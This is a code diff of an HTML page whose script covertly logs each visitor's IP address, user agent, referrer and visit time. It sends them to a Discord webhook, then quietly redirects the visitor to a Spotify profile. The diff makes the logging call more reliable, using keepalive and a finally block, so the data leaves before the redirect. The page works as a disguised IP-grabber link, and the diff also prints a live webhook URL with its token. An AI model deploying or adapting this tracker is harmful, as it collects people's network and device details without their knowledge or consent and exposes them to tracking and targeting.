@@ -14,9 +14,11 @@
   <script>
     let referrer = document.referrer || 'Doğrudan';
     fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => {
-      fetch('https://discord.com/api/webhooks/1513283799583162458/SeJddnVhH8sK1REjZwc9yhTaon0cG7kY85Q8VFhqhfDo2BQstD3-lncKGKoIIuXcYDmO', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: '**Yeni Ziyaretçi!**\n**IP:** ' + d.ip + '\n**User-Agent:** ' + navigator.userAgent + '\n**Sayfa:** ' + referrer + '\n**Zaman:** ' + new Date().toLocaleString('tr-TR')})});
+      let msg = '**Yeni Ziyaretçi!**\n**IP:** ' + d.ip + '\n**User-Agent:** ' + navigator.userAgent + '\n**Sayfa:** ' + referrer + '\n**Zaman:** ' + new Date().toLocaleString('tr-TR');
+      fetch('https://discord.com/api/webhooks/1513283799583162458/SeJddnVhH8sK1REjZwc9yhTaon0cG7kY85Q8VFhqhfDo2BQstD3-lncKGKoIIuXcYDmO', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: msg}), keepalive: true});
+    }).catch(() => {}).finally(() => {
       window.location.replace('https://open.spotify.com/user/zx9oehv0zw9qx96qowlby0ktl?si=22be720da7b1485a');
-    }).catch(() => window.location.replace('https://open.spotify.com/user/zx9oehv0zw9qx96qowlby0ktl?si=22be720da7b1485a'));
+    });
   </script>
 </body>
 </html>
